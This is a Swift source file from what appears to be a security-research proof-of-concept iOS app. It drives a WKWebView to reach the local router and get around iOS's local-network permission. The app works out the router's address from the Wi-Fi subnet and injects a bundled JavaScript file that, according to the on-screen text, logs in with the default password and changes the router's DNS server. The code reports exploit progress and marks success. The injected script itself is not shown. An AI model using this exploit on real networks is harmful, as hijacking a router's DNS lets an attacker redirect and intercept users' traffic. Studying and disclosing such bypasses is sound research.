//
//  WebViewPoC.swift
//  PoC-LanShield
//
//  Created by Alex - SEEMOO on 19.12.24.
//

import SwiftUI
import WebKit
import os

struct WebViewPoC: View {
    @State var url: URL?
    //= URL(string:"http://192.168.1.1")!
    //= URL(string:"https://google.com")!
    
    @State var host: String?
    
    @State var isLoading = false
    
    @State var finished = false
    
    @State var failed = false
    
    @State var errorMessage: String?
    
    @State var exploitUpdates = ""
    
    var body: some View {
        ZStack {
            
            VStack {
                
                VStack {
                    Text("Start the attack with the button below.")
                        .font(.headline)
                        .padding(.bottom)
                    
                    Text("The app will try to connect to the router, login with with the default password and and modify the DNS server.For this the app will control the WKWebView, which is not bound to the LAN permission on iOS.")
                    
                    
                    if isLoading && host == nil {
                        Text("Finding the router's IP...")
                            .monospaced()
                            .padding()
                    }
                    
                    Text("Exploit Updates:")
                        .monospaced()
                        .frame(minWidth:0, maxWidth: .infinity, alignment: .leading)
                    Text(self.exploitUpdates)
                        .monospaced()
                        .frame(alignment: .leading)
                    
                    if let url {
                        WebView(url: url, messageHandler: WebViewMessageHandler(openURL: openURL(url:), exploitUpdates: self.$exploitUpdates))
                            .opacity(0.5)
                    }
                    
                    if let errorMessage {
                        Text("⚠️\t\(errorMessage)")
                    }
                    
                }
                
                HStack {
                    Button {
                        isLoading = true
                        self.exploitUpdates = ""
                        self.launchAttack()
                        
                    } label: {
                        if isLoading {
                            Text("Relaunch")
                        }else {
                            Text("Start")
                        }
                    }
                    .buttonStyle(BorderedButtonStyle())
                    
                    if isLoading {
                        ProgressView()
                    }
                    if finished {
                        Text("💥")
                    }
                }
                
                
                Spacer()
            }
            .padding()
            
        }.onChange(of: self.exploitUpdates) { oldValue, newValue in
            if newValue.contains("Done.") {
                self.isLoading = false
                self.finished = true
                ExploitController.shared.exploits[0].state = .exploited
            }
        }
    }
    
    func launchAttack() {
        guard let wifiAddress = WiFiAddress().getWiFiAddress() else {
            self.failed = true
            self.errorMessage = "Couldn't get WiFi address"
            return
        }
        let subnet = wifiAddress.split(separator: ".").dropLast().joined(separator: ".")
        let host = "http://\(subnet).1"
        self.host = host
        
        guard let url = URL(string: host) else {
            self.failed = true
            self.errorMessage = "Couldn't get router address"
            return
        }
        self.url = url
    }
    
    func openURL(url: URL) {
        self.url = url
    }
}

#Preview {
    WebViewPoC()
}


struct WebView: UIViewRepresentable {

    let url: URL
    let messageHandler: WebViewMessageHandler
    
    func makeUIView(context: Context) -> WKWebView  {
        let wkwebView = WKWebView()
        
        // From: https://stackoverflow.com/questions/34751860/get-html-from-wkwebview-in-swift
        let js = "webkit.messageHandlers.didGetHTML.postMessage(document.documentElement.outerHTML.toString());"
        let script = WKUserScript(source: js, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        wkwebView.configuration.userContentController.addUserScript(script)
        
        // Load injection script
        if let scripURL = Bundle.main.url(forResource: "InjectedJavascript", withExtension: "js"),
           var scriptSource = try? String(contentsOf: scripURL, encoding: .utf8) {
            
            scriptSource = scriptSource.replacing("http://<routerIP>", with: "http://\(self.url.host!.utf8)")
            
            let script = WKUserScript(source: scriptSource, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
            wkwebView.configuration.userContentController.addUserScript(script)
        }
        
        wkwebView.configuration.userContentController.add(messageHandler, name: "didGetHTML")
        wkwebView.configuration.userContentController.add(messageHandler, name: "fetchResponse")
        wkwebView.configuration.userContentController.add(messageHandler, name: "exploit")
        wkwebView.configuration.userContentController.add(messageHandler, name: "debug")
        
        let request = URLRequest(url: url)
        os_log(.info, "Loading request at \(request, privacy:.public)")
        wkwebView.load(request)
        return wkwebView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {

    }
    
    
    let jsFetchRequest =
    """
    console.log("Welcome to JavaScript!");

    fetch('http://192.168.1.2', {
        method: 'GET',
        headers: {
        },
    })
    .then(response => response.text())
    .then(data => webkit.messageHandlers.fetchResponse.postMessage(data) )
    .catch(error => webkit.messageHandlers.fetchResponse.postMessage(error));
    """

    
}

class WebViewMessageHandler: NSObject, WKScriptMessageHandler {
    internal init(sessionID: String? = nil, openURL: ((URL) -> Void)? = nil, exploitUpdates: Binding<String>) {
        self.sessionID = sessionID
        self.openURL = openURL
        self._exploitUpdates = exploitUpdates
    }
    

    
    var sessionID: String?
    var openURL: ((URL) -> Void)?
    @Binding var exploitUpdates: String
    
    func userContentController(_ userContentController: WKUserContentController,
                               didReceive message: WKScriptMessage) {
         
        os_log(.info, "\(message.name, privacy: .public):\t\(String(describing: message.body), privacy: .public)")

        if message.name == "exploit" {
            
            if let bodyDict = message.body as? [String: Any] {
                if let urlString = bodyDict["openURL"] as? String {
                    self.openURL?(URL(string: urlString)!)
                }
            }
            
            if let body = message.body as? String {
                self.exploitUpdates += "- \(body)\n"
            }
            
            
        } else {
            os_log(.info, "\(message.name, privacy: .public):\t\(String(describing: message.body), privacy: .public)")
        }
    }
}
